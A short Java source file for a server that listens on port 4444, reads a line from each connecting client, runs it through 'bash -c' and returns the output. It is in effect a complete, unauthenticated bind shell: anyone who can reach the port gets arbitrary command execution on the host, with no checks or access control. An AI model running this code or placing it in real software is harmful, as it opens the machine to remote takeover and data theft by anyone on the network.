import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {

   public static void main(String[] args) {
       try {
           ServerSocket serverSocket = new ServerSocket(4444);

           while (true) {
               System.out.println("Server waiting for connection...");
               Socket clientSocket = serverSocket.accept();
               System.out.println("Client connected: " + clientSocket);
               BufferedReader input = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
               PrintWriter output = new PrintWriter(clientSocket.getOutputStream(), true);
               String command = input.readLine();
               System.out.println("Received command: " + command);

			try {
    ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c",command);
    java.lang.Process process = processBuilder.start();
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    StringBuilder outputStringBuilder = new StringBuilder();
    while ((line = reader.readLine()) != null) {
        outputStringBuilder.append(line).append("\n");
    }
    String outputString = outputStringBuilder.toString();
    output.println(outputStringBuilder); 
} catch (IOException e) {
    e.printStackTrace();
    output.println("Error executing command: " + e.getMessage());
}
               clientSocket.close();
           }
       } catch (IOException e) {
           e.printStackTrace();
       }
   }
}
